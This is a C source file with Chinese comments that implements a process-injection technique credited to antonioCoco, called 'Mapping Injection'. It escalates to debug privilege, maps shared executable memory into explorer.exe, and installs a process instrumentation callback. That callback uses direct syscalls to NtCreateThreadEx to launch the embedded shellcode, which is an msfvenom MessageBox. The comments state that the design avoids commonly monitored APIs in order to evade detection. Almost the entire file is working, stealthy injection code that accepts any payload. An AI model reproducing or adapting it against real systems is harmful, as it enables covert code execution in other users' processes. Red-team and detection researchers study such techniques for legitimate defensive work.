// Mapping Injection - 映射注入
// 原作者: antonioCoco (@splinter_code)
//
// 核心原理：
// 1. CreateFileMapping - 创建共享内存映射对象
// 2. MapViewOfFile3 - 映射到当前进程（写入 callback + shellcode）
// 3. MapViewOfFile3 - 映射到目标进程（相同内存，不同地址）
// 4. NtSetInformationProcess - 设置 ProcessInstrumentationCallback
// 5. 当目标进程执行系统调用时，callback 被触发
// 6. Callback 调用 NtCreateThreadEx 创建线程执行 shellcode
//
// 避免的 API：
// - VirtualAllocEx（使用 MapViewOfFile3 代替）
// - WriteProcessMemory（使用共享内存代替）
// - CreateRemoteThread（使用 NtCreateThreadEx 代替）
//
// 要求：Windows 10 1703+ (Build 15063+)

#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

// ProcessInstrumentationCallback 结构
typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION {
    ULONG Version;
    ULONG Reserved;
    PVOID Callback;
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, *PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

// ProcessInformationClass 枚举（部分）
typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
    ProcessInstrumentationCallback = 40,  // 关键值
    MaxProcessInfoClass = 64
} PROCESSINFOCLASS;

// MapViewOfFile3 和 NtSetInformationProcess 函数指针
typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength
);

typedef PVOID(NTAPI* pMapViewOfFile3)(
    HANDLE FileMapping,
    HANDLE Process,
    PVOID BaseAddress,
    ULONG64 Offset,
    SIZE_T ViewSize,
    ULONG AllocationType,
    ULONG PageProtection,
    PVOID ExtendedParameters,
    ULONG ParameterCount
);

// Callback shellcode（来自 callback.asm 编译结果）
// 这个 callback 会：
// 1. 检查全局标志位（避免递归）
// 2. 保存寄存器
// 3. 调用 DisposableHook（内部调用 NtCreateThreadEx 执行 shellcode）
// 4. 恢复寄存器和执行流
unsigned char callback[] = {
    0x48,0xba,0xff,0xff,0xff,0xff,0xff,0x7f,0x00,0x00,  // mov rdx, 0x7fffffffffff (全局变量地址，运行时填充)
    0x80,0x3a,0x00,                                      // cmp byte [rdx], 0
    0x74,0x02,                                          // je callback_start
    0xeb,0x34,                                          // jmp restore_execution
    // callback_start:
    0x41,0x52,0x50,0x53,0x55,0x57,0x56,0x54,            // push r10, rax, rbx, rbp, rdi, rsi, rsp
    0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,            // push r12, r13, r14, r15
    0x48,0x83,0xec,0x20,                                // sub rsp, 32 (shadow space)
    0x48,0x8d,0x0d,0xa9,0x01,0x00,0x00,                // lea rcx, [shellcode_placeholder]
    0xe8,0x17,0x00,0x00,0x00,                          // call DisposableHook
    0x48,0x83,0xc4,0x20,                                // add rsp, 32
    0x41,0x5f,0x41,0x5e,0x41,0x5d,0x41,0x5c,            // pop r15, r14, r13, r12
    0x5c,0x5e,0x5f,0x5d,0x5b,0x58,0x41,0x5a,            // pop rsp, rsi, rdi, rbp, rbx, rax, r10
    // restore_execution:
    0x41,0xff,0xe2,                                      // jmp r10
    // DisposableHook:
    0x48,0x89,0x54,0x24,0x10,                          // mov [rsp+16], rdx
    0x48,0x89,0x4c,0x24,0x08,                          // mov [rsp+8], rcx
    0x57,                                                // push rdi
    0x48,0x81,0xec,0xa0,0x00,0x00,0x00,                // sub rsp, 0xa0
    0x48,0xc7,0x44,0x24,0x68,0x00,0x00,0x00,0x00,      // mov qword [rsp+68h], 0 (tHandle)
    0xc7,0x44,0x24,0x70,0x30,0x00,0x00,0x00,          // mov dword [rsp+70h], 30h (objAttr.Length)
    0x48,0x8d,0x44,0x24,0x78,                          // lea rax, [rsp+78h]
    0x48,0x89,0xc7,                                      // mov rdi, rax
    0x31,0xc0,                                          // xor eax, eax
    0xb9,0x28,0x00,0x00,0x00,                          // mov ecx, 28h
    0xf3,0xaa,                                          // rep stosb
    0xb0,0x01,                                          // mov al, 1
    0x48,0x8b,0x8c,0x24,0xb8,0x00,0x00,0x00,          // mov rcx, [rsp+0b8h] (threadCreated)
    0x86,0x01,                                          // xchg [rcx], al (InterlockedExchange8)
    0x0f,0xbe,0xc0,                                      // movsx eax, al
    0x83,0xf8,0x01,                                      // cmp eax, 1
    0x75,0x02,                                          // jne SHORT skip_return
    0xeb,0x71,                                          // jmp SHORT exit_disposable
    // skip_return:
    0x48,0xc7,0x44,0x24,0x50,0x00,0x00,0x00,0x00,      // mov qword [rsp+50h], 0 (arg8)
    0xc7,0x44,0x24,0x48,0x00,0x00,0x00,0x00,          // mov dword [rsp+48h], 0 (arg7)
    0xc7,0x44,0x24,0x40,0x00,0x00,0x00,0x00,          // mov dword [rsp+40h], 0 (arg6)
    0xc7,0x44,0x24,0x38,0x00,0x00,0x00,0x00,          // mov dword [rsp+38h], 0 (arg5)
    0xc7,0x44,0x24,0x30,0x00,0x00,0x00,0x00,          // mov dword [rsp+30h], 0 (arg4)
    0x48,0xc7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,      // mov qword [rsp+28h], 0 (arg3)
    0x48,0x8b,0x84,0x24,0xb0,0x00,0x00,0x00,          // mov rax, [rsp+0b0h] (shellcodeAddr)
    0x48,0x89,0x44,0x24,0x20,                          // mov [rsp+20h], rax
    0x49,0xc7,0xc1,0xff,0xff,0xff,0xff,                // mov r9, -1 (ProcessHandle)
    0x4c,0x8d,0x44,0x24,0x70,                          // lea r8, [rsp+70h] (objAttr)
    0xba,0x00,0x00,0x00,0x20,                          // mov edx, 20000000h (GENERIC_EXECUTE)
    0x48,0x8d,0x4c,0x24,0x68,                          // lea rcx, [rsp+68h] (tHandle)
    0xe8,0x20,0x00,0x00,0x00,                          // call NtCreateThreadEx
    0x89,0x44,0x24,0x60,                                // mov [rsp+60h], eax (status)
    0x83,0x7c,0x24,0x60,0x00,                          // cmp dword [rsp+60h], 0
    0x74,0x0c,                                          // je SHORT exit_disposable
    0x31,0xc0,                                          // xor eax, eax
    0x48,0x8b,0x8c,0x24,0xb8,0x00,0x00,0x00,          // mov rcx, [rsp+0b8h]
    0x86,0x01,                                          // xchg [rcx], al (reset flag)
    // exit_disposable:
    0x48,0x81,0xc4,0xa0,0x00,0x00,0x00,                // add rsp, 0xa0
    0x5f,                                                // pop rdi
    0xc3,                                                // ret
    // NtCreateThreadEx (动态 syscall 号查找):
    0x65,0x67,0x48,0xa1,0x60,0x00,0x00,0x00,          // mov rax, gs:[60h] (PEB)
    0x81,0xb8,0x20,0x01,0x00,0x00,0x00,0x28,0x00,0x00, // cmp dword [rax+120h], 10240 (Win10 1507)
    0x74,0x64,                                          // je build_10240
    0x81,0xb8,0x20,0x01,0x00,0x00,0x5a,0x29,0x00,0x00, // cmp dword [rax+120h], 10586 (Win10 1511)
    0x74,0x5f,                                          // je build_10586
    0x81,0xb8,0x20,0x01,0x00,0x00,0x39,0x38,0x00,0x00, // cmp dword [rax+120h], 14393 (Win10 1607)
    0x74,0x5a,                                          // je build_14393
    0x81,0xb8,0x20,0x01,0x00,0x00,0xd7,0x3a,0x00,0x00, // cmp dword [rax+120h], 15063 (Win10 1703)
    0x74,0x55,                                          // je build_15063
    0x81,0xb8,0x20,0x01,0x00,0x00,0xab,0x3f,0x00,0x00, // cmp dword [rax+120h], 16299 (Win10 1709)
    0x74,0x50,                                          // je build_16299
    0x81,0xb8,0x20,0x01,0x00,0x00,0xee,0x42,0x00,0x00, // cmp dword [rax+120h], 17134 (Win10 1803)
    0x74,0x4b,                                          // je build_17134
    0x81,0xb8,0x20,0x01,0x00,0x00,0x63,0x45,0x00,0x00, // cmp dword [rax+120h], 17763 (Win10 1809)
    0x74,0x46,                                          // je build_17763
    0x81,0xb8,0x20,0x01,0x00,0x00,0xba,0x47,0x00,0x00, // cmp dword [rax+120h], 18362 (Win10 1903)
    0x74,0x41,                                          // je build_18362
    0x81,0xb8,0x20,0x01,0x00,0x00,0xbb,0x47,0x00,0x00, // cmp dword [rax+120h], 18363 (Win10 1909)
    0x74,0x3c,                                          // je build_18363
    0x7f,0x41,                                          // jg build_preview
    0xeb,0x46,                                          // jmp syscall_unknown
    // build_10240:
    0xb8,0xb3,0x00,0x00,0x00,                          // mov eax, 0xb3
    0xeb,0x44,                                          // jmp do_syscall
    // build_10586:
    0xb8,0xb4,0x00,0x00,0x00,                          // mov eax, 0xb4
    0xeb,0x3d,                                          // jmp do_syscall
    // build_14393:
    0xb8,0xb6,0x00,0x00,0x00,                          // mov eax, 0xb6
    0xeb,0x36,                                          // jmp do_syscall
    // build_15063:
    0xb8,0xb9,0x00,0x00,0x00,                          // mov eax, 0xb9
    0xeb,0x2f,                                          // jmp do_syscall
    // build_16299:
    0xb8,0xba,0x00,0x00,0x00,                          // mov eax, 0xba
    0xeb,0x28,                                          // jmp do_syscall
    // build_17134:
    0xb8,0xbb,0x00,0x00,0x00,                          // mov eax, 0xbb
    0xeb,0x21,                                          // jmp do_syscall
    // build_17763:
    0xb8,0xbc,0x00,0x00,0x00,                          // mov eax, 0xbc
    0xeb,0x1a,                                          // jmp do_syscall
    // build_18362:
    0xb8,0xbd,0x00,0x00,0x00,                          // mov eax, 0xbd
    0xeb,0x13,                                          // jmp do_syscall
    // build_18363:
    0xb8,0xbd,0x00,0x00,0x00,                          // mov eax, 0xbd
    0xeb,0x0c,                                          // jmp do_syscall
    // build_preview:
    0xb8,0xc1,0x00,0x00,0x00,                          // mov eax, 0xc1
    0xeb,0x05,                                          // jmp do_syscall
    // syscall_unknown:
    0xb8,0xff,0xff,0xff,0xff,                          // mov eax, -1
    // do_syscall:
    0x49,0x89,0xca,                                      // mov r10, rcx
    0x0f,0x05,                                          // syscall
    0xc3,                                                // ret
    0x90                                                // nop (shellcode_placeholder starts here)
};

// 全局变量标志（防止递归）
unsigned char init_global_vars = 0x00;

// 函数声明
BOOL SetPrivilege(HANDLE hToken, const wchar_t* lpszPrivilege, BOOL bEnablePrivilege);
void EnableDebugPrivilege();
DWORD GetProcessIdByName(const wchar_t* processName);
LPVOID MappingInjectionAlloc(HANDLE hProc, unsigned char* buffer, SIZE_T bufferSize, DWORD protectionType);

int main(int argc, char** argv) {
    // MessageBox shellcode (msfvenom)
    unsigned char shellcode[] = {
        0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
        0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,0x52,0x18,0x3e,0x48,0x8b,
        0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
        0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,
        0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
        0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,0x18,0x3e,0x44,
        0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,
        0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,
        0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,
        0x49,0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
        0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
        0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x3e,0x48,0x8b,0x12,
        0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x1a,
        0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x36,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,
        0x56,0x07,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,
        0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
        0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x4d,0x61,0x70,0x70,0x69,0x6e,0x67,0x20,0x49,0x6e,0x6a,
        0x65,0x63,0x74,0x69,0x6f,0x6e,0x20,0x52,0x65,0x76,0x61,0x6d,0x70,0x65,0x64,0x21,0x00,0x4d,
        0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00
    };

    const wchar_t* targetProcess = L"explorer.exe";
    HANDLE hProc = NULL;
    DWORD targetPid = 0;
    unsigned char* finalCallback = NULL;

    printf("\n\t=== Mapping Injection ===\n");
    printf("\t@splinter_code (antonioCoco)\n\n");

    // 获取 NtSetInformationProcess 函数地址
    pNtSetInformationProcess NtSetInformationProcess =
        (pNtSetInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtSetInformationProcess");

    if (!NtSetInformationProcess) {
        printf("[-] Failed to get NtSetInformationProcess address\n");
        return -1;
    }

    // 启用 Debug 权限
    EnableDebugPrivilege();

    // 查找目标进程
    targetPid = GetProcessIdByName(targetProcess);
    if (targetPid == 0) {
        printf("[-] Pid of process %ls not found. Exiting...\n", targetProcess);
        return -1;
    }

    printf("[+] Found target pid of process %ls = %lu\n", targetProcess, targetPid);

    // 打开目标进程
    hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_SET_INFORMATION, FALSE, targetPid);
    if (hProc == NULL) {
        printf("[-] Can't open process %ls. Last Error = %lu\n", targetProcess, GetLastError());
        return -1;
    }

    printf("[+] Opened target process\n\n");

    // ========== 阶段 1: 注入全局变量（防止递归）==========
    printf("[*] Injecting global variable flag...\n");
    LPVOID globalVarAddr = MappingInjectionAlloc(hProc, &init_global_vars, sizeof(init_global_vars), PAGE_READWRITE);
    printf("[+] Global variable injected at 0x%p\n\n", globalVarAddr);

    // ========== 阶段 2: 准备 Callback + Shellcode ==========
    printf("[*] Preparing callback + shellcode...\n");

    finalCallback = (unsigned char*)malloc(sizeof(callback) + sizeof(shellcode));
    if (!finalCallback) {
        printf("[-] Failed to allocate memory for callback\n");
        CloseHandle(hProc);
        return -1;
    }

    // 将全局变量地址写入 callback（偏移 2）
    memcpy((void*)&callback[2], (void*)&globalVarAddr, 8);

    // 复制 callback 和 shellcode
    memcpy((void*)finalCallback, (void*)&callback[0], sizeof(callback));
    memcpy((void*)(finalCallback + sizeof(callback)), (void*)&shellcode[0], sizeof(shellcode));

    printf("[+] Callback size: %zu bytes\n", sizeof(callback));
    printf("[+] Shellcode size: %zu bytes\n", sizeof(shellcode));
    printf("[+] Total size: %zu bytes\n\n", sizeof(callback) + sizeof(shellcode));

    // ========== 阶段 3: 注入 Callback + Shellcode ==========
    printf("[*] Injecting callback + shellcode...\n");
    LPVOID callbackAddr = MappingInjectionAlloc(hProc, finalCallback,
                                                 sizeof(callback) + sizeof(shellcode),
                                                 PAGE_EXECUTE_READ);
    printf("[+] Callback + shellcode injected at 0x%p\n\n", callbackAddr);

    // ========== 阶段 4: 设置 ProcessInstrumentationCallback ==========
    printf("[*] Setting ProcessInstrumentationCallback...\n");

    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION nirvana;
    nirvana.Callback = (PVOID)(ULONG_PTR)callbackAddr;
    nirvana.Reserved = 0;  // 总是 0
    nirvana.Version = 0;   // x64 = 0, x86 = 1

    NTSTATUS status = NtSetInformationProcess(
        hProc,
        ProcessInstrumentationCallback,
        &nirvana,
        sizeof(nirvana)
    );

    if (status != 0) {
        printf("[-] NtSetInformationProcess failed with ntstatus code 0x%lx\n", status);
        printf("    Do you have SeDebugPrivilege?\n");
        printf("    Is the target Windows 10 1703+ ?\n");
    } else {
        printf("[+] Instrumentation callback set successfully!\n");
        printf("[+] Code in the target process will be run when it makes a syscall\n");
    }

    // 清理
    free(finalCallback);
    CloseHandle(hProc);

    return 0;
}

// 设置权限
BOOL SetPrivilege(HANDLE hToken, const wchar_t* lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueW(NULL, lpszPrivilege, &luid)) {
        printf("[-] LookupPrivilegeValueW() failed, error %lu\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[-] AdjustTokenPrivileges() failed, error %lu\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

// 启用 Debug 权限
void EnableDebugPrivilege() {
    HANDLE currentProcessToken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &currentProcessToken);
    SetPrivilege(currentProcessToken, L"SeDebugPrivilege", TRUE);
    CloseHandle(currentProcessToken);
}

// 通过进程名获取 PID
DWORD GetProcessIdByName(const wchar_t* processName) {
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pidFound = 0;

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName) == 0) {
                pidFound = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return pidFound;
}

// Mapping Injection 分配函数
// 使用 CreateFileMapping + MapViewOfFile3 在两个进程间共享内存
LPVOID MappingInjectionAlloc(HANDLE hProc, unsigned char* buffer, SIZE_T bufferSize, DWORD protectionType) {
    pMapViewOfFile3 MapViewOfFile3 = (pMapViewOfFile3)GetProcAddress(
        GetModuleHandleW(L"kernelbase.dll"),
        "MapViewOfFile3"
    );

    if (!MapViewOfFile3) {
        printf("[-] MapViewOfFile3 not found. Windows 10 1703+ required\n");
        exit(-1);
    }

    // 创建文件映射对象
    HANDLE hFileMap = CreateFileMapping(
        INVALID_HANDLE_VALUE,
        NULL,
        PAGE_EXECUTE_READWRITE,
        0,
        (DWORD)bufferSize,
        NULL
    );

    if (hFileMap == NULL) {
        printf("[-] CreateFileMapping failed with error: %lu\n", GetLastError());
        exit(-1);
    }

    printf("    [+] Created file mapping object\n");

    // 映射到当前进程（用于写入数据）
    LPVOID lpMapAddress = MapViewOfFile3(
        hFileMap,
        GetCurrentProcess(),
        NULL,
        0,
        0,
        0,
        PAGE_READWRITE,
        NULL,
        0
    );

    if (lpMapAddress == NULL) {
        printf("[-] MapViewOfFile3 (current process) failed with error: %lu\n", GetLastError());
        exit(-1);
    }

    // 将数据写入映射内存
    memcpy(lpMapAddress, buffer, bufferSize);
    printf("    [+] Written %zu bytes to the mapping object\n", bufferSize);

    // 映射到目标进程（相同内存，不同地址）
    LPVOID lpMapAddressRemote = MapViewOfFile3(
        hFileMap,
        hProc,
        NULL,
        0,
        0,
        0,
        protectionType,
        NULL,
        0
    );

    if (lpMapAddressRemote == NULL) {
        printf("[-] MapViewOfFile3 (target process) failed with error: %lu\n", GetLastError());
        exit(-1);
    }

    printf("    [+] Injected object mapping to the remote process at 0x%p\n", lpMapAddressRemote);

    // 清理本地映射
    UnmapViewOfFile(lpMapAddress);
    CloseHandle(hFileMap);

    return lpMapAddressRemote;
}
